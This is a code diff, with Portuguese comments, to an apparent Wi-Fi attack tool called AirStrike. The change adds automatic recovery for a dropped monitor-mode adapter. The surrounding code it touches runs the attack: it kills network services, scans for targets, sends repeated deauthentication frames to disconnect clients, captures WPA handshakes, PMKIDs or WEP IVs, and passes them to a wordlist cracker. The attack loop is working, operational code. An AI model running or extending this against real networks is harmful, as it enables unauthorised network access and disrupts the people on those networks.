@@ -193,11 +193,17 @@ def find_wireless_iface():
     return None
 
 
-def setup_monitor(iface=None):
-    """Ativa o modo monitor. Devolve (iface_monitor, matou_processos)."""
+def setup_monitor(iface=None, fatal=True):
+    """Ativa o modo monitor. Devolve (iface_monitor, matou_processos).
+
+    Com fatal=False devolve None em vez de encerrar o programa; usado pela
+    recuperacao automatica do adaptador.
+    """
     if iface is None:
         iface = find_wireless_iface()
     if iface is None:
+        if not fatal:
+            return None
         err("nenhuma interface wireless encontrada (antena conectada? driver instalado?)")
         sys.exit(1)
 
@@ -228,6 +234,8 @@ def setup_monitor(iface=None):
     if ifaces_antes.get(iface) == "monitor":
         return iface, True
 
+    if not fatal:
+        return None
     err("nao foi possivel confirmar o modo monitor")
     err("saida do airmon-ng:\n" + out)
     sys.exit(1)
@@ -248,6 +256,61 @@ def restore_setup(monitor_iface, matou_processos):
     if base and ifaces.get(base) != "managed":
         run(["ip", "link", "set", base, "up"], timeout=15)
         run(["iw", "dev", base, "set", "type", "managed"], timeout=15)
+
+
+class Adapter:
+    """Controla a interface em modo monitor e religa o adaptador sozinho.
+
+    Se a placa cair no meio do teste (USB removido e recolocado, driver
+    reiniciado, modo monitor perdido), o AirStrike detecta em tempo real,
+    espera a interface voltar, detecta o nome automaticamente e roda de
+    novo o 'airmon-ng check kill' + 'airmon-ng start'.
+    """
+
+    def __init__(self, preferred=None):
+        self.preferred = preferred   # nome base escolhido pelo usuario (--iface)
+        self.monitor = None          # nome da interface em modo monitor
+        self.matou_processos = False  # se ja matamos NetworkManager etc.
+
+    def setup(self):
+        """Ativa o modo monitor na inicializacao."""
+        resultado = setup_monitor(self.preferred, fatal=True)
+        self.monitor, matou = resultado
+        self.matou_processos = self.matou_processos or matou
+        return self.monitor
+
+    def alive(self):
+        """True se a interface de monitor ainda existe e esta em modo monitor."""
+        if not self.monitor:
+            return False
+        return list_ifaces_with_type().get(self.monitor) == "monitor"
+
+    def recover(self, timeout=60):
+        """Espera o adaptador voltar e religa o modo monitor. Devolve bool."""
+        warn("detectei que o adaptador ou o modo monitor caiu; procurando a interface...")
+        fim = time.time() + timeout
+        while time.time() < fim:
+            ifaces = list_ifaces_with_type()
+            if ifaces.get(self.monitor) == "monitor":
+                ok(f"{self.monitor} voltou por conta propria")
+                return True
+            # A placa voltou como managed (replug de USB)? religa o monitor
+            candidata = None
+            if self.preferred and ifaces.get(self.preferred) == "managed":
+                candidata = self.preferred
+            else:
+                candidata = find_wireless_iface()
+            if candidata and ifaces.get(candidata) == "managed":
+                novo = setup_monitor(candidata, fatal=False)
+                if novo:
+                    self.monitor, matou = novo
+                    self.matou_processos = self.matou_processos or matou
+                    ok(f"adaptador religado automaticamente: {self.monitor} "
+                       f"(interface detectada: {candidata})")
+                    return True
+            time.sleep(3)
+        err(f"o adaptador nao voltou em {timeout}s")
+        return False
 
 
 # ---------------------------------------------------------------------------
@@ -396,7 +459,7 @@ def start_capture(monitor_iface, bssid, channel, out_dir, log_path):
     if proc.poll() is not None:
         err("o airodump-ng encerrou imediatamente; verifique o canal e a interface")
         err(f"log: {log_path}")
-        sys.exit(1)
+        return None, prefix
     return proc, prefix
 
 
@@ -441,13 +504,33 @@ def send_deauth(monitor_iface, bssid, count, timeout=15):
     _stop_process(proc)
 
 
-def wait_handshake(prefix, bssid, monitor_iface, capture_time, deauth_count,
-                   deauth_interval, iv_target):
+def _recover_adapter(adapter, cap, bssid, channel, out_dir, log_path):
+    """Religa o adaptador e reinicia a captura. Devolve True se conseguiu."""
+    warn("o adaptador ou o modo monitor caiu; religando automaticamente...")
+    _stop_process(cap["proc"])
+    cap["proc"] = None
+    if not adapter.recover():
+        return False
+    proc, prefix = start_capture(adapter.monitor, bssid, channel, out_dir, log_path)
+    if proc is None:
+        return False
+    cap["proc"], cap["prefix"] = proc, prefix
+    ok(f"captura retomada em {adapter.monitor} (arquivo novo: {prefix}-01.cap)")
+    return True
+
+
+def wait_handshake(adapter, cap, bssid, channel, out_dir, log_path,
+                   capture_time, deauth_count, deauth_interval, iv_target):
     """Loop da captura: faz deauth periodico e procura handshake/PMKID.
 
+    Vigia o adaptador a cada iteracao: se a placa, o modo monitor ou o
+    airodump-ng cair, roda de novo o 'airmon-ng check kill' +
+    'airmon-ng start' com o nome detectado e reinicia a captura sozinho.
+
+    cap e um dict {"proc", "prefix"} atualizado quando a captura reinicia.
     Devolve "handshake", "pmkid", "ivs" (WEP) ou "none".
     """
-    redes, _ = parse_airodump_csv(prefix + "-01.csv")
+    redes, _ = parse_airodump_csv(cap["prefix"] + "-01.csv")
     enc = ""
     for r in redes:
         if r["bssid"] == bssid.upper():
@@ -466,7 +549,14 @@ def wait_handshake(prefix, bssid, monitor_iface, capture_time, deauth_count,
             if elapsed > capture_time:
                 break
 
-            ivs, clientes = read_capture_stats(prefix, bssid)
+            # Vigia o adaptador e o airodump antes de qualquer outra coisa
+            airodump_caiu = cap["proc"] is not None and cap["proc"].poll() is not None
+            if airodump_caiu or not adapter.alive():
+                if not _recover_adapter(adapter, cap, bssid, channel, out_dir, log_path):
+                    return "none"
+                continue
+
+            ivs, clientes = read_capture_stats(cap["prefix"] + "-01.csv", bssid)
 
             if deauth_count > 0 and not wep:
                 if clientes == 0 and elapsed > 20:
@@ -476,8 +566,8 @@ def wait_handshake(prefix, bssid, monitor_iface, capture_time, deauth_count,
                         ultimo_status = time.time()
                     time.sleep(2)
                     continue
-                if elapsed == 0 or time.time() - ultimo_deauth >= deauth_interval:
-                    send_deauth(monitor_iface, bssid, deauth_count)
+                if time.time() - ultimo_deauth >= deauth_interval:
+                    send_deauth(adapter.monitor, bssid, deauth_count)
                     ultimo_deauth = time.time()
 
             if wep:
@@ -489,11 +579,11 @@ def wait_handshake(prefix, bssid, monitor_iface, capture_time, deauth_count,
                     return "ivs"
             else:
                 if time.time() - ultimo_status >= 15:
-                    cap = prefix + "-01.cap"
-                    hs = has_handshake(cap, bssid)
+                    arquivo_cap = cap["prefix"] + "-01.cap"
+                    hs = has_handshake(arquivo_cap, bssid)
                     pmkid_n = eapol_n = 0
                     if hs is not True:
-                        r = extract_22000(cap, prefix + "_check.22000", bssid)
+                        r = extract_22000(arquivo_cap, cap["prefix"] + "_check.22000", bssid)
                         if r:
                             pmkid_n, eapol_n = r
                     if hs is True or eapol_n > 0:
@@ -860,9 +950,8 @@ def main(argv=None):
 
     os.makedirs(args.out, exist_ok=True)
 
-    monitor_iface = None
-    matou_processos = False
-    capture_proc = None
+    adapter = Adapter(args.iface)
+    cap = {"proc": None, "prefix": None}
     found_key = None
     target = None
     prefix = None
@@ -870,17 +959,21 @@ def main(argv=None):
     try:
         # 1) Modo monitor --------------------------------------------------
         if args.monitor:
-            monitor_iface = args.monitor
+            adapter.monitor = args.monitor
             ifaces = list_ifaces_with_type()
-            if ifaces and ifaces.get(monitor_iface) != "monitor":
-                warn(f"{monitor_iface} nao parece estar em modo monitor (tipo: {ifaces.get(monitor_iface)})")
-            ok(f"usando interface em modo monitor: {monitor_iface}")
+            if ifaces and ifaces.get(adapter.monitor) != "monitor":
+                warn(f"{adapter.monitor} nao parece estar em modo monitor (tipo: {ifaces.get(adapter.monitor)})")
+            ok(f"usando interface em modo monitor: {adapter.monitor}")
         else:
-            monitor_iface, matou_processos = setup_monitor(args.iface)
-            ok(f"modo monitor ativo em {monitor_iface}")
+            adapter.setup()
+            ok(f"modo monitor ativo em {adapter.monitor}")
 
         # 2) Varredura -----------------------------------------------------
-        redes = scan_networks(monitor_iface, max(5, args.scan_time), args.out)
+        redes = scan_networks(adapter.monitor, max(5, args.scan_time), args.out)
+        if not redes and not adapter.alive():
+            warn("o adaptador caiu durante a varredura; religando automaticamente...")
+            if adapter.recover():
+                redes = scan_networks(adapter.monitor, max(5, args.scan_time), args.out)
         print_networks(redes)
         if args.scan_time == 0 and not (args.bssid and args.channel):
             err("sem varredura: informe --bssid e --channel")
@@ -906,8 +999,13 @@ def main(argv=None):
             warn("rede enterprise (802.1X): a wordlist nao se aplica")
 
         # 4) Captura dirigida ----------------------------------------------
-        capture_proc, prefix = start_capture(monitor_iface, bssid, channel,
-                                             args.out, os.path.join(args.out, "airodump.log"))
+        log_path = os.path.join(args.out, "airodump.log")
+        cap["proc"], cap["prefix"] = start_capture(adapter.monitor, bssid, channel,
+                                                   args.out, log_path)
+        if cap["proc"] is None:
+            err("nao foi possivel iniciar a captura; verifique o adaptador e tente de novo")
+            return 1
+        prefix = cap["prefix"]
         cap_file = prefix + "-01.cap"
 
         deauth_count = args.deauth
@@ -916,11 +1014,13 @@ def main(argv=None):
         else:
             info("teste de desconexao desabilitado (--deauth 0)")
 
-        got = wait_handshake(prefix, bssid, monitor_iface,
+        got = wait_handshake(adapter, cap, bssid, channel, args.out, log_path,
                              capture_time=max(30, args.capture_time),
                              deauth_count=deauth_count,
                              deauth_interval=max(5, args.deauth_interval),
                              iv_target=args.iv_target)
+        prefix = cap["prefix"]  # pode ter mudado se o adaptador caiu e religou
+        cap_file = prefix + "-01.cap"
         if got not in ("handshake", "pmkid", "ivs"):
             if "WEP" in enc:
                 warn("quantidade de IVs insuficiente; tentando mesmo assim")
@@ -932,8 +1032,8 @@ def main(argv=None):
                     warn("ou capture com hcxdumptool para obter PMKID diretamente")
 
         # 5) Parar captura -------------------------------------------------
-        _stop_process(capture_proc)
-        capture_proc = None
+        _stop_process(cap["proc"])
+        cap["proc"] = None
         time.sleep(1)
 
         if args.no_crack:
@@ -1015,9 +1115,9 @@ def main(argv=None):
         warn("interrompido pelo usuario")
         return 130
     finally:
-        _stop_process(capture_proc)
+        _stop_process(cap["proc"])
         if not args.keep:
-            restore_setup(monitor_iface, matou_processos)
+            restore_setup(adapter.monitor, adapter.matou_processos)
         else:
             info("--keep: interface mantida como esta")
 
